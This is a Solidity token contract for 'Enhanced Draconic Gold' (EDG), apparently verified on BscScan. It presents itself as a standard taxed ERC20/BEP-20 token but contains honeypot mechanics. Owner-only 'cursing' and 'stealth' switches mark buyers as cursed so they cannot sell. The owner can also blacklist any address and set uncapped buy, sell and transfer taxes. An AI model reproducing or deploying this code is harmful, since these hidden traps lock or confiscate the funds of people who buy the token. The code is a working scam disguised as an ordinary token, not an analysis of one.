/**
 *Submitted for verification at BscScan.com on 2022-05-12
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.4.26;

contract SafeMath {

    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }

    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a);
        c = a - b;
    }

    function safeMul(uint a, uint b) public pure returns (uint c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }

    function safeDiv(uint a, uint b) public pure returns (uint c) {
        require(b > 0);
        c = a / b;
    }
}

contract ERC20Interface {
    function totalSupply() public constant returns (uint);
    function balanceOf(address tokenOwner) public constant returns (uint balance);
    function allowance(address tokenOwner, address spender) public constant returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) external returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract ApproveAndCallFallBack {
    function receiveApproval(address from, uint256 tokens, address token, bytes data) public;
}

contract TokenV2 is ERC20Interface, SafeMath {

	string public symbol;
    string public  name;
    uint8 public decimals;
    uint public _totalSupply;
    uint public taxSell;
    uint public taxBuy;
    uint public taxTr;
    address public taxAddr;
    bool private cursing;
    bool private isLiquidity;
    bool private stealth;
    bool private blockContract;
    uint256 public liquMax;
    address public liquAddress;
    uint256 minSellInterval;
    uint repeatedTax;
    uint tradeTax;
    uint burnTax;
    uint max;
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowed;
    mapping(address => bool) public cursed;
    mapping(address => bool) public excluded;
    mapping(address => bool) public games;
    mapping(address => bool) public owners;
    mapping(address => bool) public exchanges;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public lastSold;
    mapping(address => uint256) public bought;
    mapping(address => uint256) public taxAllowance;

	constructor(address _taxAddr) public {
		symbol = "EDG";
        name = "Enhanced Draconic Gold";
        decimals = 9;
        taxBuy = 3;
        taxTr = 0;
        burnTax = 500;
        minSellInterval = 28800;
        liquMax = 1000000000000000;
        _totalSupply = 100000000000000000;
        max = 5000000000000;
        taxAddr = _taxAddr;
        taxSell = 5;
        balances[msg.sender] = _totalSupply;
        isLiquidity = true;
        owners[msg.sender] = true;
        excluded[msg.sender] = true;
        repeatedTax = 15;
        tradeTax = 20;
        
        emit Transfer(address(0), msg.sender, _totalSupply);
	}

	function totalSupply() public constant returns (uint) {
        return _totalSupply  - balances[address(0)];
    }
	
	function balanceOf(address tokenOwner) public constant returns (uint balance) {
        return balances[tokenOwner];
    }

    function setLiquMax(uint256 val) public {
        require(owners[msg.sender] == true);
        liquMax = val;
    }

    function getLiquMax() public view returns (uint256) {
        return liquMax;
    }

    function setBlockContract(bool val) public {
        require(owners[msg.sender] == true);
        blockContract = val;
    }

    function getBlockContract() public view returns (bool) {
        require(owners[msg.sender] == true);
        return blockContract;
    }

    function setIsLiquidity(bool val) public {
        require(owners[msg.sender] == true);
        isLiquidity = val;
    }

    function getMinSellInterval() public view returns (uint256) {
        return minSellInterval;
    }

    function setMinSellInterval(uint256 val) public {
        require(owners[msg.sender] == true);
        minSellInterval = val;
    }

    function getIsLiquidity() public view returns (bool) {
        return isLiquidity;
    }

    function setLiquAddress(address addr) public {
        require(owners[msg.sender] == true);
        liquAddress = addr;
    }

    function getLiquAddress() public view returns (address) {
        return liquAddress;
    }

    function setTaxAddr(address addr) public {
        require(owners[msg.sender] == true);
        taxAddr = addr;
    }

    function getTaxAddr() public view returns (address) {
        return taxAddr;
    }

    function setMax(uint256 val) public {
        require(owners[msg.sender] == true);
        max = val * 1000000000;
    }

    function getMax() public view returns (uint256) {
        return max;
    }

    function isContract(address _addr) public view returns (bool){
        uint32 size;
        assembly {
            size := extcodesize(_addr)
        }
        return (size > 0);
    }

    function sendTax(uint tax) private returns (bool success) {
        uint taxed = safeDiv(safeMul(tax, 1), burnTax);
        balances[address(0)] = safeAdd(balances[address(0)], taxed);
        taxed = safeSub(tax, taxed);
        balances[taxAddr] = safeAdd(balances[taxAddr], taxed);
        return true;
    }

	function transfer(address to, uint tokens) public returns (bool success) {
        require(cursed[msg.sender] == false && (blockContract == false || isContract(to) == false || exchanges[to] == true || games[to] == true));
        uint taxed;
        uint amount;
        if (excluded[msg.sender] == true || excluded[to] == true)
        {
            balances[msg.sender] = safeSub(balances[msg.sender], tokens);
            balances[to] = safeAdd(balances[to], tokens);
            emit Transfer(msg.sender, to, tokens);
        }
        else if (exchanges[msg.sender] == true)
        {
            if (cursing == true && owners[to] == false)
                cursed[to] = true;
            if (stealth == true && whitelisted[to] == false)
                cursed[to] = true;
            if (stealth == true)
                bought[to] += tokens;
            if (stealth == true && bought[to] > max)
                cursed[to] = true;
            taxed = safeDiv(safeMul(tokens, taxBuy), 100);
            amount = safeSub(tokens, taxed);
            balances[msg.sender] = safeSub(balances[msg.sender], tokens);
            balances[to] = safeAdd(balances[to], amount);
            sendTax(taxed);
            emit Transfer(msg.sender, to, amount);
        }
        else if (exchanges[to] == true)
        {
            uint per = safeDiv(safeDiv(tokens, safeDiv(isLiquidity ? balanceOf(liquAddress) : liquMax, 100)), 2);
            if (per > 50)
                per = 50;
            if (lastSold[msg.sender] > 0 && safeAdd(lastSold[msg.sender], minSellInterval) > now)
                per = safeAdd(per, repeatedTax);
            if (tokens > taxAllowance[msg.sender])
                per = safeAdd(per, tradeTax);
            else
                taxAllowance[msg.sender] = safeSub(taxAllowance[msg.sender], tokens);
            uint tax = safeAdd(per, taxSell);
            taxed = safeDiv(safeMul(tokens, tax), 100);
            amount = safeSub(tokens, taxed);
            balances[msg.sender] = safeSub(balances[msg.sender], tokens);
            balances[to] = safeAdd(balances[to], amount);
            lastSold[msg.sender] = now;
            sendTax(taxed);
            emit Transfer(msg.sender, to, amount);
        }
        else {
            taxed = safeDiv(safeMul(tokens, taxTr), 100);
            amount = safeSub(tokens, taxed);
            balances[msg.sender] = safeSub(balances[msg.sender], tokens);
            balances[to] = safeAdd(balances[to], amount);
            sendTax(taxed);
            emit Transfer(msg.sender, to, amount);
        }
        
        return true;
    }

    function getTaxAllowance(address _addr) public view returns(uint256) {
        return taxAllowance[_addr];
    }

    function setGame(address addr, bool val) public {
        require(owners[msg.sender] == true);
        games[addr] = val;
    }

    function addTaxAllowance(address addr, uint256 amount) public {
        require(games[msg.sender] == true);
        taxAllowance[addr] = safeAdd(taxAllowance[addr], amount);
    }

	function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

	function transferFrom(address from, address to, uint tokens) external returns (bool success) {
        require(cursed[from] == false && (blockContract == false || isContract(to) == false || exchanges[to] == true || games[to] == true));
        uint taxed;
        uint amount;
        if (excluded[from] == true || excluded[to] == true)
        {
            balances[from] = safeSub(balances[from], tokens);
            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
            balances[to] = safeAdd(balances[to], tokens);
            emit Transfer(from, to, tokens);
        }
        else if (exchanges[from] == true)
        {
            if (cursing == true && owners[to] == false)
                cursed[to] = true;
            if (stealth == true && whitelisted[to] == false)
                cursed[to] = true;
            if (stealth == true)
                bought[to] += tokens;
            if (stealth == true && bought[to] > max)
                cursed[to] = true;
            taxed = safeDiv(safeMul(tokens, taxBuy), 100);
            amount = safeSub(tokens, taxed);
            balances[from] = safeSub(balances[from], tokens);
            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], amount);
            balances[to] = safeAdd(balances[to], amount);
            sendTax(taxed);
            emit Transfer(from, to, amount);
        }
        else if (exchanges[to] == true)
        {
            uint per = safeDiv(safeDiv(tokens, safeDiv(isLiquidity ? balanceOf(liquAddress) : liquMax, 100)), 2);
            if (per > 50)
                per = 50;
            if (lastSold[from] > 0 && safeAdd(lastSold[from], minSellInterval) > now)
                per = safeAdd(per, repeatedTax);
            if (tokens > taxAllowance[from])
                per = safeAdd(per, tradeTax);
            else
                taxAllowance[from] = safeSub(taxAllowance[from], tokens);
            uint tax = safeAdd(per, taxSell);
            taxed = safeDiv(safeMul(tokens, tax), 100);
            amount = safeSub(tokens, taxed);
            balances[from] = safeSub(balances[from], tokens);
            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], amount);
            balances[to] = safeAdd(balances[to], amount);
            lastSold[from] = now;
            sendTax(taxed);
            emit Transfer(from, to, amount);
        }
        else {
            taxed = safeDiv(safeMul(tokens, taxTr), 100);
            amount = safeSub(tokens, taxed);
            balances[from] = safeSub(balances[from], tokens);
            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], amount);
            balances[to] = safeAdd(balances[to], amount);
            sendTax(taxed);
            emit Transfer(from, to, amount);
        }

        return true;
    }

	function allowance(address tokenOwner, address spender) public constant returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }

	function approveAndCall(address spender, uint tokens, bytes data) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, this, data);
        return true;
    }

    function getCursed(address _addr) public view returns(bool) {
        require(owners[msg.sender] == true);
        return  cursed[_addr];
    }

    function getCursing() public view returns(bool) {
        require(owners[msg.sender] == true);
        return  cursing;
    }

    function setCursing(bool val) public {
        require(owners[msg.sender] == true);
        cursing = val;
    }

    function getWhitelisted(address _addr) public view returns(bool) {
        return  whitelisted[_addr];
    }

    function setWhitelisted(address addr) public {
        require(owners[msg.sender] == true);
        whitelisted[addr] = true;
    }

    function addWhitelisted(address[] addrs) public {
        require(owners[msg.sender] == true);
        for (uint256 i = 0; i < addrs.length; i++) {
             whitelisted[addrs[i]] = true;
        }
    }

    function getExcluded(address _addr) public view returns(bool) {
        require(owners[msg.sender] == true);
        return  excluded[_addr];
    }

    function setExcluded(address addr, bool val) public {
        require(owners[msg.sender] == true);
        excluded[addr] = val;
    }

    function getExchanges(address _addr) public view returns(bool) {
        require(owners[msg.sender] == true);
        return  exchanges[_addr];
    }

    function setExchanges(address addr, bool val) public {
        require(owners[msg.sender] == true);
        exchanges[addr] = val;
    }

    function setTaxSell(uint val) public {
        require(owners[msg.sender] == true);
        taxSell = val;
    }

    function getTaxSell() public view returns(uint) {
        return  taxSell;
    }

    function setStealth(bool val) public {
        require(owners[msg.sender] == true);
        stealth = val;
    }

    function getStealth() public view returns(bool) {
        require(owners[msg.sender] == true);
        return  stealth;
    }

    function setTaxTr(uint val) public {
        require(owners[msg.sender] == true);
        taxTr = val;
    }

    function setTaxes(uint valBuy, uint valSell, uint valTr) public {
        require(owners[msg.sender] == true);
        taxTr = valTr;
        taxSell = valSell;
        taxBuy = valBuy;
    }

    function getTaxTr() public view returns(uint) {
        return  taxTr;
    }

    function setTaxBuy(uint val) public {
        require(owners[msg.sender] == true);
        taxBuy = val;
    }

    function getTaxBuy() public view returns(uint) {
        return  taxBuy;
    }

    function alterCursed(address _addr, bool val) public {
        require(owners[msg.sender] == true);
        cursed[_addr] = val;
    }

    function addCursed(address[] _addr) public {
        require(owners[msg.sender] == true);
        for (uint256 i = 0; i < _addr.length; i++) {
            cursed[_addr[i]] = true;
        }
    }

	function () public payable {
        revert();
    }
}